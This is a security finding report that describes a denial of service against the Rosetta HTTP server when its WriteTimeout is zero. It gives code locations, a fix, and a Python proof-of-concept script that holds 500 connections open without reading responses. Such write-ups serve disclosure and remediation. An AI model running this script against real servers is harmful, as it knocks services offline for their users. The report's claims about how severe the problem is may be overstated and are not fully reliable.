### Title
Response-Hold DoS via Unvalidated Zero `Http.WriteTimeout` in Rosetta HTTP Server

### Summary
The `Http` struct in `rosetta/app/config/types.go` defines `WriteTimeout` as a plain `time.Duration` with no minimum-value validation. When this field is zero (Go's zero value, or explicitly set to `0`), Go's `net/http` server sets no write deadline on connections. An unprivileged attacker can open many connections, send valid requests, and never read responses, causing server goroutines to block on `conn.Write()` indefinitely, exhausting memory and goroutine pools.

### Finding Description
**Code location:**

- `rosetta/app/config/types.go`, lines 64–69: `Http` struct declares `WriteTimeout time.Duration` with no validation tag, no minimum enforcement, and no `Validate()` method.
- `rosetta/main.go`, lines 220–227: `httpServer.WriteTimeout` is assigned directly from `rosettaConfig.Http.WriteTimeout` without any guard:

```go
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,   // ← no validation
}
```

**Root cause:** Go's zero value for `time.Duration` is `0`. If the embedded `application.yml` omits `writeTimeout`, or an operator sets it to `0`, `http.Server.WriteTimeout` becomes `0`, which per Go's `net/http` documentation means *no write deadline is set*. `LoadConfig()` in `config.go` performs no post-unmarshal validation of `Http` fields.

**Exploit flow:**
1. Server starts with `WriteTimeout = 0` (default zero value or explicit misconfiguration — no code prevents it).
2. Attacker opens many TCP connections to the Rosetta port.
3. Attacker sends syntactically valid HTTP POST requests (e.g., to `/network/list`).
4. Attacker's TCP receive window is kept at zero (or the attacker simply never reads).
5. Server goroutines block indefinitely on `conn.Write()` with no deadline to abort them.
6. Goroutine count and heap grow without bound until OOM or goroutine exhaustion.

**Existing checks reviewed:** `LoadConfig()` in `rosetta/app/config/config.go` only performs YAML unmarshalling and node-map decoding — no range or minimum checks on any `Http` duration field. There is no middleware-level write deadline override.

### Impact Explanation
A zero `WriteTimeout` removes the only server-side mechanism that reclaims goroutines blocked on slow/non-reading clients. Each stalled goroutine holds its stack (starting at ~8 KB, growing as needed) plus the associated `http.response` buffers. With enough concurrent connections the process exhausts memory and crashes, taking down the entire Rosetta API — a complete availability loss for all users and downstream integrations.

### Likelihood Explanation
The precondition (WriteTimeout = 0) is the Go zero value, meaning it is the default if the embedded `application.yml` does not explicitly set `writeTimeout`. No privilege is required to open TCP connections to a public-facing Rosetta port. The attack is trivially scriptable with standard tools (`wrk`, `hping3`, raw sockets) and is fully repeatable. Even if the default config sets a non-zero value, the absence of code-level validation means any operator misconfiguration or environment-variable override to `0` silently re-enables the condition.

### Recommendation
1. Add a post-load validation step in `LoadConfig()` (or a dedicated `Validate()` method on `Config`) that rejects or replaces any `Http` timeout field that is `<= 0`:
   ```go
   if mirrorConfig.Rosetta.Http.WriteTimeout <= 0 {
       return nil, errors.New("http.writeTimeout must be > 0")
   }
   ```
2. Set an explicit, documented default (e.g., `30s`) for `writeTimeout` in the embedded `application.yml`.
3. Apply the same check to `ReadTimeout`, `ReadHeaderTimeout`, and `IdleTimeout`.

### Proof of Concept
```bash
# 1. Start rosetta with writeTimeout unset (defaults to 0)
# 2. Open 500 connections, send requests, never read responses:
python3 - <<'EOF'
import socket, time, threading

def hold(i):
    s = socket.socket()
    s.connect(("127.0.0.1", 8082))
    # Send a complete HTTP request
    s.send(b"POST /network/list HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\n\r\n{}")
    # Never read the response — goroutine on server blocks on Write forever
    time.sleep(9999)

threads = [threading.Thread(target=hold, args=(i,)) for i in range(500)]
for t in threads: t.start()
for t in threads: t.join()
EOF
# 3. Observe server goroutine count and RSS grow without bound (e.g., via /debug/pprof/goroutine)
# 4. Server becomes unresponsive / OOM-killed
```
